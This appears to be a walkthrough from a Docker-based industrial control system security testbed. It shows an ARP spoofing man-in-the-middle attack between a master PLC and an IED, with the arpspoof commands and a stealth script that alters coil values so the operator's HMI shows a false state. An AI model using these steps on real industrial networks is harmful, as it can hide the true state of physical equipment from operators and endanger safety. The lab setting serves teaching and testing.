This section describes the procedure for conducting an ARP poisoning attack to inject false data between the MPLC and M-IED1 without detection by the operator. Notably, all files and tools required to execute this attack are already included within the provided Docker container.

- Use the ARP attacker node:
```bash
docker exec -ti Attacker-Node-ARP bash
```

--- 

The first step involves sending gratuitous ARP messages to the victims to poison their respective ARP tables.

- ARP spoofing targeting M-IED1:
```bash
arpspoof -i eth0 10.0.0.192 -rt 10.0.0.21
```
![mied1 spoof](https://github.com/NS-unina/SCASS/blob/master/AttackerNode-ARP/images/poison-mied1.png "Figure: mied1 spoof")

- ARP spoofing targeting MPLC:
```bash
arpspoof -i eth0 10.0.0.21 -rt 10.0.0.192
```
![mplc spoof](https://github.com/NS-unina/SCASS/blob/master/AttackerNode-ARP/images/poison-MPLC.png "Figure: mplc sppof")

Then, he attacker can intercept and modify the network traffic to reach their malicious objectives.

```bash
python3 coilModificationStealth.py
```
![Packet Modification](https://github.com/NS-unina/SCASS/blob/master/AttackerNode-ARP/images/spoof.png "Figure: Packet Modification")

In this case, from the HMI interface, we can observe that MIED1 appears to be closed. However, by checking the MIED1 status, it is possible to confirm that the displayed MIED1 is open.

![HMI](https://github.com/NS-unina/SCASS/blob/master/AttackerNode-ARP/images/HMI.png "Figure: HMI")

- Use the MIED1 container:
```bash
docker exec -ti M-IED1 bash
```
- Check coil status:
```bash
cat status.txt ; echo
```
![Coil status](https://github.com/NS-unina/SCASS/blob/master/AttackerNode-ARP/images/coilStatus.png "Figure: Coil status")
